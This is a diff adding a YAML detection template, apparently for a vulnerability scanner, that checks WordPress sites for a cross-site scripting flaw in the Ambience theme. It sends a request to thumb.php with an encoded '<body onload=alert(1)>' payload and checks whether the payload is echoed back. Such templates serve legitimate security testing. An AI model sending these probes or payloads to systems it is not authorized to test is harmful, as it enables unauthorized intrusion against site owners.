@@ -1,0 +1,41 @@
+id: wp-ambience-xss
+brief:
+    title: WordPress Ambience Theme <=1.0 - Cross-Site Scripting
+    by: daffainfo
+    level: medium
+    about: WordPress Ambience Theme 1.0 and earlier was affected by a cross-site scripting vulnerability.
+    label:
+        - wp-plugin
+        - wp
+        - edb
+        - wpscan
+        - wordpress
+        - xss
+        - vuln
+    score: CVSS:5.4
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}'
+      signs:
+        - "on": word
+          has:
+            - /wp-content/themes/ambience/
+          in: body
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/themes/ambience/thumb.php?src=%3Cbody%20onload%3Dalert(1)%3E.jpg'
+      signs:
+        - "on": word
+          has:
+            - <body onload=alert(1)>
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
